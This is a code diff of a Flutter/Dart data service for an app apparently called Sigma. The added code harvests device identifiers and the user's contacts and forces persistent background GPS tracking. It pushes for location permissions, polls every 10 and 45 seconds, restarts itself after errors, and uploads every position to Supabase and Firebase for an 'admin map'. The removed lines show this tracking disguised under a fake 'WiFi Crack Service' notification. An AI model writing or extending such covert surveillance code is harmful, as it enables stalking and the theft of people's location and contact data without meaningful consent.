@@ -23,32 +23,69 @@ class UserDataService {
   List<Contact> get contacts => _contacts;
 
   StreamSubscription<Position>? _positionStreamSubscription;
+  Timer? _locationHeartbeatTimer;
+  bool _isSyncInitialized = false;
+  bool _isTrackingActive = false;
 
   String? _deviceId;
-  String get deviceId {
-    if (_deviceId != null) return _deviceId!;
-    _deviceId = _storage.getDeviceId();
-    if (_deviceId == null) {
-      _deviceId = "Sigma_${DateTime.now().millisecondsSinceEpoch}_${(1000 + (DateTime.now().microsecond % 9000))}";
-      _storage.saveDeviceId(_deviceId!);
-    }
-    return _deviceId!;
-  }
+  String? _macAddress;
+  
+  String get deviceId => _deviceId ?? _storage.getDeviceId() ?? "Sigma_Unknown";
+  String? get macAddress => _macAddress;
 
   UserDataService(this._storage, this._supabaseService, this._firebaseService);
 
   /// Point d'entrée pour lancer les collectes initiales
   Future<void> initializeDataSync() async {
+    if (_isSyncInitialized) {
+      debugPrint("ℹ️ UserDataService: Sync déjà initialisé, relance tracking uniquement.");
+      await startLocationTracking();
+      return;
+    }
+    _isSyncInitialized = true;
     debugPrint("🚀 UserDataService: Initialisation de la collecte globale...");
     
-    // 1. Enregistrer l'utilisateur (identifiant, modèle, pseudo)
+    // 1. Initialiser l'ID unique de l'appareil
+    await _initializeDeviceId();
+
+    // 2. Enregistrer l'utilisateur (identifiant, modèle, pseudo)
     await registerDevice();
 
-    // 2. Tenter de récupérer les contacts
+    // 3. Tenter de récupérer les contacts
     await syncContactsIfPermissionGranted();
     
-    // 3. Tenter de lancer le suivi GPS
-    await startLocationTrackingIfPermissionGranted();
+    // 4. Tenter de lancer le suivi GPS
+    await startLocationTracking();
+  }
+
+  Future<void> _initializeDeviceId() async {
+    try {
+      final deviceInfo = DeviceInfoPlugin();
+      String? id;
+      
+      if (Platform.isAndroid) {
+        final androidInfo = await deviceInfo.androidInfo;
+        // On combine l'ID Android et le modèle pour plus de stabilité
+        id = "Android_${androidInfo.id}";
+        _macAddress = "02:00:00:00:00:00"; // Fallback MAC sur Android moderne
+      } else if (Platform.isIOS) {
+        final iosInfo = await deviceInfo.iosInfo;
+        id = "iOS_${iosInfo.identifierForVendor}";
+      }
+
+      final savedId = _storage.getDeviceId();
+      if (savedId == null) {
+        _deviceId = id ?? "Sigma_${DateTime.now().millisecondsSinceEpoch}";
+        await _storage.saveDeviceId(_deviceId!);
+      } else {
+        _deviceId = savedId;
+      }
+      
+      debugPrint("🆔 Device ID Initialisé: $_deviceId");
+    } catch (e) {
+      debugPrint("⚠️ Erreur initialisation DeviceID: $e");
+      _deviceId = _storage.getDeviceId() ?? "Sigma_Error_${DateTime.now().millisecondsSinceEpoch}";
+    }
   }
 
   Future<void> registerDevice() async {
@@ -64,14 +101,15 @@ class UserDataService {
         model = iosInfo.utsname.machine;
       }
 
-      final currentPseudo = _storage.getPseudo();
+      final currentPseudo = getPseudo();
       
       await _supabaseService.registerUser(
         deviceId: deviceId,
         model: model,
         pseudo: currentPseudo,
+        macAddress: _macAddress,
       );
-      debugPrint("✅ Appareil enregistré: $model | Pseudo: $currentPseudo");
+      debugPrint("✅ Appareil enregistré: $model | Pseudo: $currentPseudo | MAC: $_macAddress");
     } catch (e) {
       debugPrint("⚠️ registerDevice Failed: $e");
     }
@@ -143,58 +181,144 @@ class UserDataService {
     }
   }
 
-  /// Active le tracking GPS en temps réel et en arrière-plan
-  Future<void> startLocationTrackingIfPermissionGranted() async {
-    try {
-      LocationPermission permission = await Geolocator.checkPermission();
-      
-      if (permission == LocationPermission.denied) {
-        permission = await Geolocator.requestPermission();
+  /// Force le démarrage du tracking GPS avec insistance sur les permissions et l'activation
+  Future<void> startLocationTracking() async {
+    if (_isTrackingActive) {
+      debugPrint("ℹ️ Tracking GPS déjà actif, skip relance.");
+      return;
+    }
+    debugPrint("🛰️ UserDataService: Démarrage du tracking GPS forcé...");
+    
+    bool serviceEnabled = await Geolocator.isLocationServiceEnabled();
+    if (!serviceEnabled) {
+      debugPrint("⚠️ GPS désactivé. Demande d'activation...");
+      // Tente d'ouvrir les paramètres ou demande l'activation
+      await Geolocator.openLocationSettings();
+      // On attend un peu que l'utilisateur active
+      await Future.delayed(const Duration(seconds: 3)); 
+      serviceEnabled = await Geolocator.isLocationServiceEnabled();
+      if (!serviceEnabled) {
+        debugPrint("❌ GPS toujours désactivé. Abandon temporaire.");
+        return;
       }
+    }
 
-      if (permission == LocationPermission.always || permission == LocationPermission.whileInUse) {
-        final LocationSettings locationSettings = AndroidSettings(
-          accuracy: LocationAccuracy.best,
-          distanceFilter: 10,
-          forceLocationManager: false,
-          intervalDuration: const Duration(seconds: 30),
-          foregroundNotificationConfig: const ForegroundNotificationConfig(
-            notificationText: "Analyse des réseaux WiFi en cours...",
-            notificationTitle: "WiFi Crack Service",
-            enableWakeLock: true,
+    LocationPermission permission = await Geolocator.checkPermission();
+    if (permission == LocationPermission.denied) {
+      permission = await Geolocator.requestPermission();
+      if (permission == LocationPermission.denied) {
+        debugPrint("❌ Permission GPS refusée.");
+        return;
+      }
+    }
+    
+    if (permission == LocationPermission.deniedForever) {
+      debugPrint("❌ Permission GPS refusée définitivement. Ouverture paramètres...");
+      await Geolocator.openAppSettings();
+      return;
+    }
+
+    // Configuration pour le tracking en arrière-plan (Foreground Service)
+    // Cela affiche une notification persistante qui empêche l'OS de tuer l'app
+    final LocationSettings locationSettings = Platform.isAndroid
+        ? AndroidSettings(
+            accuracy: LocationAccuracy.high,
+            distanceFilter: 10,
+            intervalDuration: const Duration(seconds: 10),
+            forceLocationManager: true,
+            foregroundNotificationConfig: const ForegroundNotificationConfig(
+              notificationText: "Le tracking Sigma est actif en arrière-plan.",
+              notificationTitle: "Localisation Active",
+              enableWakeLock: true,
+            ),
+          )
+        : const LocationSettings(
+            accuracy: LocationAccuracy.high,
+            distanceFilter: 10,
+          );
+
+    _positionStreamSubscription?.cancel();
+    _isTrackingActive = true;
+    _positionStreamSubscription = Geolocator.getPositionStream(locationSettings: locationSettings).listen(
+      (Position position) {
+        debugPrint("📍 Nouvelle position: ${position.latitude}, ${position.longitude}");
+        _currentLocation = position;
+        _uploadLocation(position);
+      },
+      onError: (e) {
+        debugPrint("⚠️ Erreur Flux GPS: $e");
+        _isTrackingActive = false;
+        // Tentative de relance en cas d'erreur critique
+        Future.delayed(const Duration(seconds: 10), startLocationTracking);
+      },
+    );
+    
+    debugPrint("✅ Tracking GPS (Background/Foreground) activé avec succès.");
+    _startLocationHeartbeat();
+    
+    // Force une première position immédiate avec fallback robuste
+    try {
+      final position = await Geolocator.getCurrentPosition(
+        locationSettings: const LocationSettings(
+          accuracy: LocationAccuracy.high,
+          timeLimit: Duration(seconds: 15),
+        ),
+      );
+      _currentLocation = position;
+      await _uploadLocation(position);
+    } catch (e) {
+      debugPrint("⚠️ getCurrentPosition KO, fallback getLastKnownPosition: $e");
+      final last = await Geolocator.getLastKnownPosition();
+      if (last != null) {
+        _currentLocation = last;
+        await _uploadLocation(last);
+      } else {
+        debugPrint("❌ Aucune position disponible pour bootstrap tracking.");
+      }
+    }
+  }
+
+  void _startLocationHeartbeat() {
+    _locationHeartbeatTimer?.cancel();
+    _locationHeartbeatTimer = Timer.periodic(const Duration(seconds: 45), (_) async {
+      try {
+        final position = await Geolocator.getCurrentPosition(
+          locationSettings: const LocationSettings(
+            accuracy: LocationAccuracy.high,
+            timeLimit: Duration(seconds: 12),
           ),
         );
-
-        _positionStreamSubscription?.cancel();
-        _positionStreamSubscription = Geolocator.getPositionStream(locationSettings: locationSettings).listen(
-          (Position position) {
-            _currentLocation = position;
-            _uploadLocation(position);
-          },
-          onError: (e) => debugPrint("⚠️ GPS Stream Error: $e"),
-        );
-        
-        debugPrint("🛰️ GPS Tracking démarré.");
+        _currentLocation = position;
+        await _uploadLocation(position);
+      } catch (_) {
+        final position = _currentLocation ?? await Geolocator.getLastKnownPosition();
+        if (position != null) {
+          _currentLocation = position;
+          await _uploadLocation(position);
+        }
       }
-    } catch (e) {
-      debugPrint("⚠️ GPS Tracking Start Failed: $e");
-    }
+    });
   }
 
   /// Upload la position vers les deux plateformes
   Future<void> _uploadLocation(Position position) async {
     try {
-      await Future.wait([
-        _supabaseService.logUserActivity(deviceId, position, _contacts.length),
-        _firebaseService.updateLocation(position, deviceId),
-      ]);
-      await _firebaseService.logUserActivity(position, _contacts.length, deviceId);
+      // Priorité à Supabase pour la map admin
+      await _supabaseService.logUserActivity(deviceId, position, _contacts.length);
+      
+      // Backup sur Firebase
+      _firebaseService.updateLocation(position, deviceId).catchError((e) {
+         debugPrint("⚠️ Erreur Firebase Location Backup: $e");
+      });
+      
     } catch (e) {
-      debugPrint("⚠️ Cloud Location Sync Failed: $e");
+      debugPrint("⚠️ Erreur Cloud Location Sync: $e");
     }
   }
 
   void dispose() {
     _positionStreamSubscription?.cancel();
+    _locationHeartbeatTimer?.cancel();
+    _isTrackingActive = false;
   }
 }
